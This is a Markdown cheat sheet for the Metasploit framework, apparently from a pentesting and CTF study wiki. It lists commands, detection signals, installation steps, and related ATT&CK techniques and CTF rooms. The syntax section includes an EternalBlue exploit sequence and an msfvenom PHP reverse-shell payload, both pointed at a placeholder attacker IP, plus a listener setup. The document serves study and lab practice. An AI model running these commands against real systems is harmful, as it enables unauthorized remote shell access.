---
Usage Phase:
  - Privilege Escalation
  - Exploitation
Common Use Cases:
  - Reverse Shell
  - File Transfer
  - Banner Grabbing
  - Simple Port Scan
Interface Type: CLI
---
---
# Brief
Metasploit is a powerful open-source exploitation framework used to develop, test, and execute exploits against systems. It includes modules for scanning, payload generation, session handling, and post-exploitation. Often used in red teaming, CTFs, and real-world pentests, it supports automation of common attack workflows and integrates with a backend database for engagement management.

---
# Primary Syntax / Example Usage
- Start Console: `msfconsole`
- Search for Module: `search smb`
- Use Exploit: `use exploit/windows/smb/ms17_010_eternalblue`
- Set Options and Run:
	```metasploit
	set RHOSTS <target>
	set payload windows/x64/meterpreter/reverse_tcp
	set LHOST <attacker_ip>
	set LPORT 4444
	run
	```
- Generate Payload (msfvenom)
	```metasploit
	msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f raw > shell.php
	``` 
- Start Listener (Multi/Handler)
	```
	use exploit/multi/handler
	set payload php/meterpreter_reverse_tcp
	set LHOST <attacker_ip>
	set LPORT 4444
	run
	```
- Use DB-backed Nmap: `db_nmap -sV -p- <target_ip>`

---
# Signals of Presence
- Open port `4444`, `7777`, or other listener ports unexpectedly active
- Shell prompt suddenly accessed (`meterpreter >`, `C:\Windows\system32>`)
- File artifacts like `shell.php`, `rev_shell.exe`, `shell.elf`
- Suspicious outbound traffic to attacker-controlled IPs
- HTTP POST or TCP connection spikes from web server processes
- Background sessions (e.g. `sessions -l` shows active shells)

---
# Installation
- Debian Based Systems:
	```
	sudo apt update && sudo apt install metasploit-framework
	```
- Manual setup (with DB):
	```
	sudo systemctl start postgresql
	sudo -u postgres msfdb init
	msfconsole
	```
- Verify DB: `db_status`

---
# Notes
- `msfvenom` replaces `msfpayload` and `msfencode`
- Payloads can be encoded (`-e`) but this is not a full AV evasion
- Use `sessions -i <id>` to interact with active shells
- Workspace feature helps organize multi-target engagements
- Metasploit’s scanners are slower than Nmap; best used for targeted service scans
- `db_nmap` auto-imports results into the Metasploit database
- `loot`, `vulns`, `hosts`, `services` are database-backed info views

---
# Related Techniques
- [T1059 – Command and Scripting Interpreter](Techniques/T1059-Command-and-Scripting-Interpreter)  
- [T1203 – Exploitation for Client Execution](Techniques/T1203-Exploitation-for-Client-Execution)  
- [T1055 – Process Injection](Techniques/T1055-Process-Injection)  
- [T1105 – Ingress Tool Transfer](Techniques/T1105-Ingress-Tool-Transfer)  
- [T1021 – Remote Services](Techniques/T1021-Remote-Services)  


---
# Related CTFs
- [Vulnversity](CTFs/Vulnversity) – Reverse shell via payload injection  
- [Overpass](CTFs/Overpass) – Multi-handler used for reverse shell  
- [Bounty Hacker](CTFs/Bounty%20Hacker) – Enumeration and exploitation  
- [Kenobi](CTFs/Kenobi) – SMB scanning and exploitation  
- [Blue](CTFs/Blue) – EternalBlue / MS17-010 module usage  
- [Lame](CTFs/Lame) – Classic MSF+payload box  

---
# References
- [Metasploit Docs](https://docs.metasploit.com)  
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed)  
- [TryHackMe – Metasploit Intro](https://tryhackme.com/room/metasploitintro)  
- [TryHackMe – Metasploit Exploitation](https://tryhackme.com/room/metasploitexploitation)  
- [Payload Cheat Sheet – Rapid7](https://docs.rapid7.com/metasploit/payloads)  
- [PayloadsAllTheThings – Path Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)  
- [Official GitHub](https://github.com/rapid7/metasploit-framework)  